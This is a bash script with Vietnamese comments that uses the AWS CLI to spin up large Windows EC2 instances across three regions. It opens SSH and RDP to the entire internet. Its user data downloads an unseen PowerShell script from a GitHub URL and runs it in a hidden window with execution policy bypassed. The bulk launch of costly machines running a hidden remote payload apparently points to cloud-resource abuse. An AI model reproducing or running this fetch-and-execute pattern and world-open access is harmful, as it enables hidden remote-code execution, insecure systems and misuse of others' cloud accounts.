#!/bin/bash

# Định nghĩa danh sách region và Windows Server 2022 AMI ID tương ứng
declare -A regions
regions["us-east-1"]="ami-001adaa5c3ee02e10"
regions["us-east-2"]="ami-0b041308c8b9767f3"
regions["us-west-2"]="ami-0a1f75c71aceb9a3f"

# URL chứa User Data (PowerShell Script trên GitHub)
user_data_url="https://raw.githubusercontent.com/hieudv194/Auto/refs/heads/main/Win.ps1"

# Tạo nội dung User Data cho Windows
user_data_file="/tmp/user_data.ps1"
echo "<powershell>" > "$user_data_file"
echo "Invoke-WebRequest -Uri \"$user_data_url\" -OutFile \"C:\\Windows\\Temp\\Win.ps1\"" >> "$user_data_file"
echo "Start-Process -FilePath \"powershell.exe\" -ArgumentList \"-ExecutionPolicy Bypass -File C:\\Windows\\Temp\\Win.ps1\" -WindowStyle Hidden" >> "$user_data_file"
echo "</powershell>" >> "$user_data_file"

# Mã hóa User Data chuẩn Windows
user_data_base64=$(base64 "$user_data_file" | tr -d '\n')

# Lặp qua từng region để khởi tạo instance
for region in "${!regions[@]}"; do
    image_id="${regions[$region]}"
    echo "🔹 Đang xử lý vùng $region với AMI ID: $image_id"

    # Định nghĩa Key Pair
    key_name="KeyDH-$region"
    key_file="${HOME}/.aws_keys/${key_name}.pem"
    mkdir -p "$(dirname "$key_file")"

    # Kiểm tra và tạo Key Pair nếu chưa có
    if ! aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
        aws ec2 create-key-pair \
            --key-name "$key_name" \
            --region "$region" \
            --query "KeyMaterial" \
            --output text > "$key_file"
        chmod 400 "$key_file"
        echo "✅ Đã tạo Key Pair $key_name và lưu tại $key_file"
    else
        echo "✔ Key Pair $key_name đã tồn tại."
    fi

    # Kiểm tra và tạo Security Group nếu chưa có
    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group \
            --group-name "$sg_name" \
            --description "Security group cho $region" \
            --region "$region" \
            --query "GroupId" \
            --output text)
        echo "✅ Đã tạo Security Group $sg_name với ID $sg_id."
    else
        echo "✔ Security Group $sg_name đã tồn tại với ID $sg_id."
    fi

    # Mở cổng SSH (22) và RDP (3389) nếu chưa có
    for port in 22 3389; do
        if ! aws ec2 describe-security-group-rules --region "$region" --filters Name=group-id,Values="$sg_id" Name=ip-permission.from-port,Values="$port" Name=ip-permission.to-port,Values="$port" Name=ip-permission.cidr,Values=0.0.0.0/0 > /dev/null 2>&1; then
            aws ec2 authorize-security-group-ingress \
                --group-id "$sg_id" \
                --protocol tcp \
                --port "$port" \
                --cidr 0.0.0.0/0 \
                --region "$region"
            echo "✅ Đã mở cổng $port cho Security Group $sg_name."
        else
            echo "✔ Cổng $port đã được mở trước đó."
        fi
    done

    # Chọn Subnet ID tự động
    subnet_id=$(aws ec2 describe-subnets --region "$region" --query "Subnets[0].SubnetId" --output text)

    if [ -z "$subnet_id" ]; then
        echo "❌ Không tìm thấy Subnet khả dụng trong $region."
        continue
    fi

    # Khởi tạo Windows EC2 Instance
    instance_id=$(aws ec2 run-instances \
        --image-id "$image_id" \
        --count 1 \
        --instance-type c7a.16xlarge \
        --key-name "$key_name" \
        --security-group-ids "$sg_id" \
        --subnet-id "$subnet_id" \
        --user-data "$user_data_base64" \
        --region "$region" \
        --query "Instances[0].InstanceId" \
        --output text 2>/tmp/ec2_error.log)

    if [ -z "$instance_id" ]; then
        echo "❌ Lỗi: Không thể tạo instance trong $region."
        cat /tmp/ec2_error.log
        continue
    fi

    echo "🚀 Đã tạo Instance $instance_id trong $region."
done

echo "✅ Hoàn tất khởi chạy EC2 Windows trên 3 vùng AWS!"
